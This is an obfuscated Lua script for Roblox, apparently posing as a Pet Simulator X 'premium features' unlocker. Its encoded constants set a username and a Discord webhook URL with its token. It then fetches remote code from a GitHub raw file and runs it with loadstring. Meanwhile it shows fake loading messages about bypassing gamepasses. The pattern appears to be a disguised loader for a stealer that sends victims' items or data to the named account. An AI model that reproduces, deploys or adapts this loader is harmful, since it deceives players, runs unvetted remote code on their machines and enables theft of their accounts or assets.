--Stealing this script will lead you to be copyrighted by W41K3R

do
	local v0 = tonumber;
	local v1 = string.byte;
	local v2 = string.char;
	local v3 = string.sub;
	local v4 = string.gsub;
	local v5 = string.rep;
	local v6 = table.concat;
	local v7 = table.insert;
	local v8 = math.ldexp;
	local v9 = getfenv or function()
		return _ENV;
	end;
	local v10 = setmetatable;
	local v11 = pcall;
	local v12 = select;
	local v13 = unpack or table.unpack;
	local v14 = tonumber;
	local function v15(v16, v17, ...)
		local v18 = 0;
		local v19;
		local v20;
		local v21;
		local v22;
		local v23;
		local v24;
		local v25;
		local v26;
		local v27;
		local v28;
		local v29;
		local v30;
		while true do
			if (v18 == 0) then
				v19 = 1;
				v20 = nil;
				v16 = v4(v3(v16, 5), "..", function(v31)
					if (v1(v31, 2) == 79) then
						local v74 = 0;
						while true do
							if (v74 == 0) then
								v20 = v0(v3(v31, 1, 1));
								return "";
							end
						end
					else
						local v75 = v2(v0(v31, 16));
						if v20 then
							local v79 = 0;
							local v80;
							while true do
								if (v79 == 1) then
									return v80;
								end
								if (v79 == 0) then
									v80 = v5(v75, v20);
									v20 = nil;
									v79 = 1;
								end
							end
						else
							return v75;
						end
					end
				end);
				v21 = nil;
				v18 = 1;
			end
			if (v18 == 5) then
				v30 = nil;
				function v30(v32, v33, v34)
					local v35 = v32[1];
					local v36 = v32[2];
					local v37 = v32[3];
					return function(...)
						local v68 = 0;
						local v69;
						local v70;
						local v71;
						local v72;
						local v73;
						while true do
							if (v68 == 3) then
								A, B = v28(v11(v73));
								if not A[1] then
									local v95 = 0;
									local v96;
									while true do
										if (v95 == 0) then
											v96 = v32[4][v69] or "?";
											error("Script error at [" .. v96 .. "]:" .. A[2]);
											break;
										end
									end
								else
									return v13(A, 2, B);
								end
								break;
							end
							if (v68 == 1) then
								v71 = {...};
								v72 = v12("#", ...) - 1;
								v68 = 2;
							end
							if (v68 == 2) then
								v73 = nil;
								function v73()
									local v84 = v35;
									local v85 = v36;
									local v86 = v37;
									local v87 = v28;
									local v88 = {};
									local v89 = {};
									local v90 = {};
									for v97 = (0 - 0) - 0, v72 do
										if (((3202 + 1704) > (2359 - (1648 + 16))) and (v97 >= v86)) then
											v88[v97 - v86] = v71[v97 + (823 - (454 + 368))];
										else
											v90[v97] = v71[v97 + (232 - (61 + 170))];
										end
									end
									local v91 = (v72 - v86) + (723 - (119 + 603));
									local v92;
									local v93;
									while true do
										local v98 = 0 + 0;
										local v99;
										while true do
											if (((1723 + 919) > (2073 - (21 + 432))) and ((1688 - ((2410 - (1547 + 18)) + 843)) == v98)) then
												v99 = 495 - (100 + 234 + 161);
												while true do
													if ((v99 == (0 - 0)) or ((1278 + 1624) == (611 + 174))) then
														v92 = v84[v69];
														v93 = v92[1 + 0];
														v99 = 3 - 2;
													end
													if (((4190 - (198 + 90)) > (3424 - (148 + 598))) and (v99 == (2 - 1))) then
														if ((((402 - 186) + 3256) >= (1935 - 1402)) and (v93 <= (4 + (3 - 2)))) then
															if (((6070 - 2085) > (1979 - 820)) and (v93 <= ((6 + 0) - 4))) then
																if (((3145 + 42) >= (6678 - 3971)) and (v93 <= ((884 - (595 + 289)) + 0))) then
																	v90[v92[1053 - (496 + 555)]]();
																elseif ((v93 == ((1759 - (794 + 962)) - (764 - (300 + 462)))) or ((3255 - (261 + 1170)) < ((1894 - (980 + 714)) + 77))) then
																	v90[v92[(1151 - (27 + 391)) - (339 + 392)]] = v34[v92[(921 - 538) - (23 + 357)]];
																else
																	v69 = v92[1567 - (1193 + 371)];
																end
															elseif ((v93 <= (1692 - (759 + 930))) or ((2377 + 1584) <= ((28402 - 13959) - 10970))) then
																if (((3269 + 1130) >= (1880 - (888 + 357))) and (v90[v92[(6878 - 5103) - (837 + 936)]] == v92[176 - (142 + 30)])) then
																	v69 = v69 + 1 + 0;
																else
																	v69 = v92[6 - 3];
																end
															elseif (((14352 - (10601 + 172)) > (1339 + (1944 - (256 + 948)))) and (v93 > (3 + 1))) then
																local v124 = 1926 - (67 + 133 + 1726);
																local v125;
																local v126;
																local v127;
																local v128;
																while true do
																	if ((v124 == 1) or ((5847 - (1265 + 291 + 391)) > ((39465 - 26107) - 9407))) then
																		local v152 = 1358 - (247 + (2847 - 1736));
																		while true do
																			if (((1414 + 241) < 3004) and ((2 - 1) == v152)) then
																				v124 = 90 - (67 + 21);
																				break;
																			end
																			if (((1900 - 758) >= (644 - (52 + 64))) and (v152 == (1048 - (636 + 412)))) then
																				v70 = (v127 + v125) - (4 - 3);
																				v128 = 263 - (85 + (2021 - (1167 + 676)));
																				v152 = 1 - 0;
																			end
																		end
																	end
																	if (((4860 - ((2030 - (494 + 1206)) + 790)) == ((13017 + 4451) - 13728)) and (v124 == (3 - 1))) then
																		for v154 = v125, v70 do
																			local v155 = 0 - 0;
																			local v156;
																			while true do
																				if (((0 + (0 - 0)) == v155) or ((18 + 18 + 390) > (291 + 150))) then
																					v156 = 0 - (0 - 0);
																					while true do
																						if ((v156 == (0 + 0)) or ((6271 - 3188) < ((4133 - 1865) - (657 + 2 + 314)))) then
																							v128 = v128 + (1 - 0);
																							v90[v154] = v126[v128];
																							break;
																						end
																					end
																					break;
																				end
																			end
																		end
																		break;
																	end
																	if ((v124 == (1287 - (1041 + 246))) or ((6714 - 4326) >= (15995 - 11797))) then
																		local v153 = 0 + 0 + 0;
																		while true do
																			if (((2160 - (159 + 255)) <= ((3969 + 42) - (1087 + 1128))) and (v153 == (3 - (5 - 3)))) then
																				v124 = 311 - (289 + 17 + 4);
																				break;
																			end
																			if (((368 + 268) < (2426 - 452)) and ((0 - 0) == v153)) then
																				v125 = v92[3 - 1];
																				v126, v127 = v87(v90[v125](v13(v90, v125 + (701 - (264 + 293 + 143)), v92[1 + 2])));
																				v153 = 2 - 1;
																			end
																		end
																	end
																end
															else
																v90[v92[1323 - (572 + (1380 - 631))]][v92[(9 - 6) - 0]] = v92[5 - (194 - (111 + 82))];
															end
														elseif (((2346 - (193 + 576)) < (503 + 1576)) and (v93 <= (387 - (37 + 48 + 294)))) then
															if ((v93 <= ((1 + 15) - 10)) or ((8839 - 6519) == (1189 - 627))) then
																do
																	return;
																end
															elseif ((v93 == (2 + 5)) or ((161 + 1900) <= (3119 - (16 + (4952 - 3228))))) then
																local v131 = 0 - 0;
																local v132;
																local v133;
																while true do
																	if (((2428 - (644 + 863)) >= (1519 - (935 + 165))) and ((1888 - (569 + 1318)) == v131)) then
																		while true do
																			if ((v132 == (0 - 0)) or ((503 + 155) >= (7195 - (13581 - 8604)))) then
																				v133 = v92[(3 - 0) - (2 - 1)];
																				v90[v133] = v90[v133](v13(v90, v133 + (2 - 1), v70));
																				break;
																			end
																		end
																		break;
																	end
																	if ((((1610 - (500 + 522)) + 1191) <= (1281 + 2460)) and (v131 == (0 + 0))) then
																		v132 = (2064 - (1424 + 357)) - (79 + 204);
																		v133 = nil;
																		v131 = (1 + 0) - 0;
																	end
																end
															else
																v90[v92[(1872 - (696 + 213)) - (612 + 349)]] = v92[1 + 0 + 2];
															end
														elseif (((2782 - (533 + 267)) >= ((8000 - 5462) - 1009)) and (v93 <= (30 - 21))) then
															local v116 = (1672 - (1649 + 23)) - 0;
															local v117;
															local v118;
															local v119;
															while true do
																if (((1078 + (983 - (264 + 633))) < (172 + 1677)) and (v116 == (1 + 0))) then
																	v119 = nil;
																	while true do
																		if ((((7517 - 4942) - (2080 - 500)) <= (465 + 1456)) and (v117 == (0 + 0))) then
																			local v157 = 167 - (146 + (86 - 65));
																			while true do
																				if (((5729 - (603 + 1043)) >= (784 - (38 + 313))) and (v157 == (1 + 0))) then
																					v117 = 1242 - (862 + 379);
																					break;
																				end
																				if ((v157 == (1728 - (228 + 584 + 916))) or ((3283 - (227 + 57)) == (18412 - 14372))) then
																					v118 = v92[(294 - 132) - (35 + 125)];
																					v119 = v90[v92[3 - 0]];
																					v157 = 1;
																				end
																			end
																		end
																		if ((v117 == (1670 - (1159 + 510))) or ((1227 + 3356) <= (849 - (33 + 42)))) then
																			v90[v118 + (425 - (418 + 6))] = v119;
																			v90[v118] = v119[v92[1 + 3]];
																			break;
																		end
																	end
																	break;
																end
																if ((v116 == (0 + 0 + 0)) or ((428 + 3782) < (1041 - 663))) then
																	v117 = 0 + 0;
																	v118 = nil;
																	v116 = 1 + (0 - 0);
																end
															end
														elseif (((5805 - 3362) >= (6095 - (5192 - (33 + 447)))) and (v93 == 10)) then
															v34[v92[855 - (421 + 431)]] = v90[v92[2]];
														else
															v90[v92[1540 - ((927 - (50 + 193)) + (1141 - 287))]] = v92[1233 - ((2114 - (1397 + 313)) + 826)] ~= (0 + 0 + 0);
														end
														v69 = v69 + 1 + 0 + 0;
														break;
													end
												end
												break;
											end
										end
									end
								end
								v68 = 3;
							end
							if (v68 == 0) then
								v69 = 1;
								v70 = -1;
								v68 = 1;
							end
						end
					end;
				end
				return v30(v29(), {}, v17)(...);
			end
			if (4 == v18) then
				v28 = nil;
				function v28(...)
					return {...}, v12("#", ...);
				end
				v29 = nil;
				function v29()
					local v38 = 0;
					local v39;
					local v40;
					local v41;
					local v42;
					local v43;
					local v44;
					local v45;
					local v46;
					while true do
						if (v38 == 0) then
							v39 = 0 + 0;
							v40 = nil;
							v38 = 1;
						end
						if ((756 - (387 + 368)) == v38) then
							v41 = nil;
							v42 = nil;
							v38 = 2;
						end
						if (v38 ~= (11 - 8)) then
						else
							v45 = nil;
							v46 = nil;
							v38 = 4;
						end
						if (v38 == (1133 - (323 + 808))) then
							v43 = nil;
							v44 = nil;
							v38 = 3;
						end
						if (v38 ~= 4) then
						else
							while true do
								if (v39 ~= (2 - 1)) then
								else
									v42 = nil;
									v43 = nil;
									v39 = 2;
								end
								if (v39 ~= (0 + 0)) then
								else
									v40 = 0;
									v41 = nil;
									v39 = 1;
								end
								if (v39 ~= (3 - 1)) then
								else
									local v100 = 0;
									while true do
										if (v100 ~= (497 - (463 + 34))) then
										else
											v44 = nil;
											v45 = nil;
											v100 = 1;
										end
										if (v100 == 1) then
											v39 = 3;
											break;
										end
									end
								end
								if (v39 ~= 3) then
								else
									v46 = nil;
									while true do
										local v101 = 0;
										local v102;
										while true do
											if (0 == v101) then
												v102 = 0 - 0;
												while true do
													if (v102 == (0 - 0)) then
														if (v40 == (8 - 6)) then
															local v109 = 0;
															while true do
																local v115 = 0 + 0;
																while true do
																	if (v115 ~= (1063 - (69 + 994))) then
																	else
																		if (v109 == 0) then
																			for v143 = 1 - 0, v24() do
																				local v144 = 690 - (419 + 271);
																				local v145;
																				local v146;
																				local v147;
																				while true do
																					if (v144 == 1) then
																						v147 = nil;
																						while true do
																							if (v145 == 0) then
																								local v170 = 378 - (113 + 265);
																								local v171;
																								while true do
																									if ((0 + 0) == v170) then
																										v171 = 0 - 0;
																										while true do
																											if (v171 ~= 0) then
																											else
																												v146 = 1611 - (751 + 860);
																												v147 = nil;
																												v171 = 1;
																											end
																											if ((1328 - (1050 + 277)) == v171) then
																												v145 = 1;
																												break;
																											end
																										end
																										break;
																									end
																								end
																							end
																							if (v145 == (2 - 1)) then
																								while true do
																									if (0 == v146) then
																										v147 = v22();
																										if (v21(v147, 129 - (49 + 79), 1065 - (50 + 1014)) == (1935 - (1868 + 67))) then
																											local v180 = 1718 - (576 + 1142);
																											local v181;
																											local v182;
																											local v183;
																											local v184;
																											while true do
																												if (v180 ~= (1768 - (1418 + 350))) then
																												else
																													v181 = 102 - (53 + 49);
																													v182 = nil;
																													v180 = 652 - (29 + 622);
																												end
																												if (v180 ~= 2) then
																												else
																													while true do
																														if (v181 == 1) then
																															local v189 = 0;
																															while true do
																																if (v189 ~= (1991 - (1715 + 276))) then
																																else
																																	v184 = {v23(),v23(),nil,nil};
																																	if (v182 == (0 + 0)) then
																																		local v199 = 0 + 0;
																																		local v200;
																																		while true do
																																			if (v199 == 0) then
																																				v200 = 0 + 0;
																																				while true do
																																					if (v200 == (1037 - (562 + 475))) then
																																						v184[3] = v23();
																																						v184[4] = v23();
																																						break;
																																					end
																																				end
																																				break;
																																			end
																																		end
																																	elseif (v182 == 1) then
																																		v184[3] = v24();
																																	elseif (v182 == 2) then
																																		v184[1478 - (381 + 1094)] = v24() - ((2 + 0) ^ 16);
																																	elseif (v182 ~= 3) then
																																	else
																																		local v207 = 1317 - (412 + 905);
																																		local v208;
																																		local v209;
																																		while true do
																																			if ((57 - (52 + 5)) ~= v207) then
																																			else
																																				v208 = 870 - (777 + 93);
																																				v209 = nil;
																																				v207 = 1 - 0;
																																			end
																																			if (v207 ~= (42 - (30 + 11))) then
																																			else
																																				while true do
																																					if (v208 == 0) then
																																						v209 = 0;
																																						while true do
																																							if (v209 == (0 - 0)) then
																																								v184[6 - 3] = v24() - ((2 + 0) ^ (7 + 9));
																																								v184[8 - 4] = v23();
																																								break;
																																							end
																																						end
																																						break;
																																					end
																																				end
																																				break;
																																			end
																																		end
																																	end
																																	v189 = 1950 - (926 + 1023);
																																end
																																if (v189 == 1) then
																																	v181 = 1 + 1;
																																	break;
																																end
																															end
																														end
																														if (v181 == 2) then
																															if (v21(v183, 1 - 0, 1) == 1) then
																																v184[2] = v46[v184[1564 - (398 + 1164)]];
																															end
																															if (v21(v183, 5 - 3, 2) == (1 + 0)) then
																																v184[3] = v46[v184[1 + 2]];
																															end
																															v181 = 3;
																														end
																														if ((1410 - (1053 + 357)) ~= v181) then
																														else
																															local v190 = 0;
																															while true do
																																if (v190 ~= (4 - 3)) then
																																else
																																	v181 = 1118 - (279 + 838);
																																	break;
																																end
																																if (v190 ~= 0) then
																																else
																																	local v198 = 0;
																																	while true do
																																		if (v198 ~= (0 + 0)) then
																																		else
																																			v182 = v21(v147, 962 - (486 + 474), 5 - 2);
																																			v183 = v21(v147, 18 - (7 + 7), 319 - (89 + 224));
																																			v198 = 1812 - (522 + 1289);
																																		end
																																		if (v198 ~= (923 - (760 + 162))) then
																																		else
																																			v190 = 1;
																																			break;
																																		end
																																	end
																																end
																															end
																														end
																														if (v181 == 3) then
																															if (v21(v183, 3, 1232 - (1108 + 121)) ~= (243 - (47 + 195))) then
																															else
																																v184[4] = v46[v184[4]];
																															end
																															v41[v143] = v184;
																															break;
																														end
																													end
																													break;
																												end
																												if (1 ~= v180) then
																												else
																													v183 = nil;
																													v184 = nil;
																													v180 = 5 - 3;
																												end
																											end
																										end
																										break;
																									end
																								end
																								break;
																							end
																						end
																						break;
																					end
																					if (0 ~= v144) then
																					else
																						v145 = 0;
																						v146 = nil;
																						v144 = 1 + 0;
																					end
																				end
																			end
																			for v148 = 470 - (120 + 349), v24() do
																				v42[v148 - 1] = v29();
																			end
																			v109 = 1;
																		end
																		if (v109 ~= 1) then
																		else
																			for v150 = 4 - 3, v24() do
																				v43[v150] = v24();
																			end
																			return v44;
																		end
																		break;
																	end
																end
															end
														end
														if (v40 ~= (1 + 0)) then
														else
															local v110 = 0 + 0;
															local v111;
															while true do
																if (v110 == (0 - 0)) then
																	v111 = 1862 - (779 + 1083);
																	while true do
																		if (v111 == 1) then
																			local v139 = 484 - (143 + 341);
																			local v140;
																			while true do
																				if (v139 ~= 0) then
																				else
																					v140 = 1268 - (1259 + 9);
																					while true do
																						if (1 == v140) then
																							v111 = 2;
																							break;
																						end
																						if (v140 ~= 0) then
																						else
																							local v168 = 319 - (179 + 140);
																							while true do
																								if (v168 == (1009 - (709 + 299))) then
																									v140 = 1 + 0;
																									break;
																								end
																								if (v168 ~= (0 - 0)) then
																								else
																									for v175 = 1747 - (1531 + 215), v45 do
																										local v176 = 0;
																										local v177;
																										local v178;
																										local v179;
																										while true do
																											if (v176 ~= (1 + 0)) then
																											else
																												v179 = nil;
																												while true do
																													if (v177 == 1) then
																														if (v178 == (1 + 0)) then
																															v179 = v22() ~= 0;
																														elseif (v178 == 2) then
																															v179 = v25();
																														elseif (v178 ~= 3) then
																														else
																															v179 = v26();
																														end
																														v46[v175] = v179;
																														break;
																													end
																													if (v177 ~= (0 - 0)) then
																													else
																														local v186 = 1140 - (293 + 847);
																														local v187;
																														local v188;
																														while true do
																															if ((96 - (82 + 13)) ~= v186) then
																															else
																																while true do
																																	if (v187 ~= 0) then
																																	else
																																		v188 = 0 - 0;
																																		while true do
																																			if (v188 == 0) then
																																				local v202 = 0;
																																				while true do
																																					if (v202 ~= (444 - (430 + 13))) then
																																					else
																																						v188 = 1;
																																						break;
																																					end
																																					if (v202 == (0 + 0)) then
																																						local v204 = 0;
																																						while true do
																																							if (v204 == (0 - 0)) then
																																								v178 = v22();
																																								v179 = nil;
																																								v204 = 1;
																																							end
																																							if (v204 == (1 + 0)) then
																																								v202 = 3 - 2;
																																								break;
																																							end
																																						end
																																					end
																																				end
																																			end
																																			if (v188 ~= 1) then
																																			else
																																				v177 = 1 + 0;
																																				break;
																																			end
																																		end
																																		break;
																																	end
																																end
																																break;
																															end
																															if (v186 ~= (0 - 0)) then
																															else
																																v187 = 0 - 0;
																																v188 = nil;
																																v186 = 1 + 0;
																															end
																														end
																													end
																												end
																												break;
																											end
																											if (v176 == (0 + 0)) then
																												v177 = 1251 - (829 + 422);
																												v178 = nil;
																												v176 = 1 - 0;
																											end
																										end
																									end
																									v44[3] = v22();
																									v168 = 1 - 0;
																								end
																							end
																						end
																					end
																					break;
																				end
																			end
																		end
																		if (v111 == 0) then
																			local v141 = 1284 - (504 + 780);
																			local v142;
																			while true do
																				if (v141 == 0) then
																					v142 = 0 - 0;
																					while true do
																						if (v142 ~= 1) then
																						else
																							v111 = 1;
																							break;
																						end
																						if ((0 - 0) ~= v142) then
																						else
																							local v169 = 0;
																							while true do
																								if (v169 ~= (3 - 2)) then
																								else
																									v142 = 1 + 0;
																									break;
																								end
																								if (v169 == 0) then
																									v45 = v24();
																									v46 = {};
																									v169 = 1;
																								end
																							end
																						end
																					end
																					break;
																				end
																			end
																		end
																		if (v111 == 2) then
																			v40 = 1448 - (804 + 642);
																			break;
																		end
																	end
																	break;
																end
															end
														end
														v102 = 224 - (159 + 64);
													end
													if (v102 == (1 + 0)) then
														if (v40 == 0) then
															local v112 = 0 - 0;
															local v113;
															local v114;
															while true do
																if (v112 ~= 0) then
																else
																	v113 = 0 + 0;
																	v114 = nil;
																	v112 = 1 - 0;
																end
																if (v112 ~= (1 + 0)) then
																else
																	while true do
																		if (0 == v113) then
																			v114 = 588 - (13 + 575);
																			while true do
																				if (v114 == 0) then
																					local v161 = 1031 - (719 + 312);
																					while true do
																						if (v161 ~= 0) then
																						else
																							v41 = {};
																							v42 = {};
																							v161 = 1 - 0;
																						end
																						if (v161 ~= 1) then
																						else
																							v114 = 1;
																							break;
																						end
																					end
																				end
																				if (v114 == (1 + 0)) then
																					local v162 = 0;
																					while true do
																						if ((0 + 0) ~= v162) then
																						else
																							v43 = {};
																							v44 = {v41,v42,nil,v43};
																							v162 = 1;
																						end
																						if (v162 == 1) then
																							v114 = 1 + 1;
																							break;
																						end
																					end
																				end
																				if (v114 == (1 + 1)) then
																					v40 = 2 - 1;
																					break;
																				end
																			end
																			break;
																		end
																	end
																	break;
																end
															end
														end
														break;
													end
												end
												break;
											end
										end
									end
									break;
								end
							end
							break;
						end
					end
				end
				v18 = 5;
			end
			if (2 == v18) then
				function v23()
					local v47, v48 = v1(v16, v19, v19 + (1595 - (363 + 1230)));
					v19 = v19 + (625 - (620 + 3));
					return (v48 * (240 + 16)) + v47;
				end
				v24 = nil;
				function v24()
					local v49, v50, v51, v52 = v1(v16, v19, v19 + (12 - 9));
					v19 = v19 + (932 - (253 + 675));
					return (v52 * (4712934 + 12064282)) + (v51 * ((40606 + 26630) - (531 + 1169))) + (v50 * (689 - 433)) + v49;
				end
				v25 = nil;
				v18 = 3;
			end
			if (1 == v18) then
				function v21(v53, v54, v55)
					if v55 then
						local v76 = 0 + 0;
						local v77;
						while true do
							if ((930 - (168 + 762)) == v76) then
								v77 = (v53 / ((5 - 3) ^ (v54 - (1 + 0)))) % (2 ^ (((v55 - (2 - 1)) - (v54 - 1)) + 1));
								return v77 - (v77 % (1 - 0));
							end
						end
					else
						local v78 = ((5 - 1) - 2) ^ (v54 - (1 + 0));
						return (((v53 % (v78 + v78)) >= v78) and (376 - (163 + 212))) or (0 - (0 + 0));
					end
				end
				v22 = nil;
				function v22()
					local v56 = 506 - (418 + 88);
					local v57;
					while true do
						if (v56 == (0 - 0)) then
							v57 = v1(v16, v19, v19);
							v19 = v19 + (1 - 0);
							v56 = 1 + 0;
						end
						if (v56 == (898 - (469 + 428))) then
							return v57;
						end
					end
				end
				v23 = nil;
				v18 = 2;
			end
			if (v18 == 3) then
				function v25()
					local v58 = v24();
					local v59 = v24();
					local v60 = (5587 - 3984) - (1124 + 478);
					local v61 = (v21(v59, 3 - 2, 59 - 39) * ((6 - 4) ^ (1557 - (1482 + (164 - 121))))) + v58;
					local v62 = v21(v59, 93 - 72, 31);
					local v63 = ((v21(v59, 32) == (1 + 0)) and -(1 + (813 - (355 + 458)))) or (1 - 0);
					if (v62 == (0 + 0)) then
						if (v61 == (0 + 0)) then
							return v63 * (0 - 0);
						else
							local v81 = 0 + 0 + 0;
							while true do
								if (v81 == (0 + 0)) then
									v62 = 1 - 0;
									v60 = 0;
									break;
								end
							end
						end
					elseif (v62 == (3620 - 1573)) then
						return ((v61 == ((212 - (109 + 103)) + (0 - 0))) and (v63 * ((281 - (271 + 9)) / (716 - (634 + 82))))) or (v63 * NaN);
					end
					return v8(v63, v62 - 1023) * (v60 + (v61 / ((7 - (2 + 3)) ^ 52)));
				end
				v26 = nil;
				function v26(v64)
					local v65 = 0 + 0;
					local v66;
					local v67;
					while true do
						if (v65 == (1736 - (1224 + 512))) then
							v66 = nil;
							if not v64 then
								local v94 = (2344 - (438 + 1406)) - (95 + 405);
								while true do
									if (v94 == (0 + 0)) then
										v64 = v24();
										if (v64 == (1199 - (997 + 202))) then
											return "";
										end
										break;
									end
								end
							end
							v65 = 1 - 0;
						end
						if ((2 + 0) == v65) then
							v67 = {};
							for v82 = 2 - 1, #v66 do
								v67[v82] = v2(v1(v3(v66, v82, v82)));
							end
							v65 = 6 - 3;
						end
						if ((3 - 2) == v65) then
							v66 = v3(v16, v19, (v19 + v64) - ((3 - 2) + 0));
							v19 = v19 + v64;
							v65 = 1 + 1;
						end
						if ((13 - 10) == v65) then
							return v6(v67);
						end
					end
				end
				v27 = v24;
				v18 = 4;
			end
		end
	end
	v15("LOL!193O00028O00026O00F03F030D3O006C6F6164696E677363722O656E03023O005F4703103O00437573746F6D5363726970744E616D6503093O0050726F6A6563745744027O004003083O00557365726E616D65030C3O00626C61636B5F666972654D4303073O00576562482O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F313037313231323731343834353739383530312F35686F49355A6A4E316F7A6B7A2O4563566B325965374B7A6E64584B4E74754D7765304475636B614C4936505A4D5967346D67613970526B72534E52374F524A414B7138026O001040030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574034F3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4A757374616E6F74686572646D652F70657473696D782O322F6D61696E2F70657473696D6775692O732E6C756103053O005465787431031C3O00456E61626C696E67207072656D69756D20636F64653A20354769394403053O00546578743203193O00456E61626C696E67207072656D69756D206665617475726573026O00084003053O00546578743303143O00427970612O73696E672067616D6570612O73657303053O005465787434030D3O00416C6D6F737420646F6E652O2E00293O0012083O00013O0026033O0008000100020004023O000800012O000B000100013O00120A000100033O001201000100043O0030040001000500060012083O00073O0026033O000F000100010004023O000F0001001208000100093O00120A000100083O0012080001000B3O00120A0001000A3O0012083O00023O0026033O00190001000C0004023O001900010012010001000D3O0012010002000E3O00200900020002000F001208000400104O0005000200044O000700013O00024O0001000100010004023O002800010026033O0020000100070004023O00200001001201000100043O003004000100110012001201000100043O0030040001001300140012083O00153O0026033O0001000100150004023O00010001001201000100043O003004000100160017001201000100043O0030040001001800190012083O000C3O0004023O000100012O00063O00017O00293O00023O00043O00043O00053O00053O00063O00063O00073O00093O00093O000A3O000A3O000B3O000B3O000C3O000E3O000E3O000F3O000F3O000F3O000F3O000F3O000F3O000F3O00103O00123O00123O00133O00133O00143O00143O00153O00173O00173O00183O00183O00193O00193O001A3O001B3O001D3O00", v9(), ...);
end
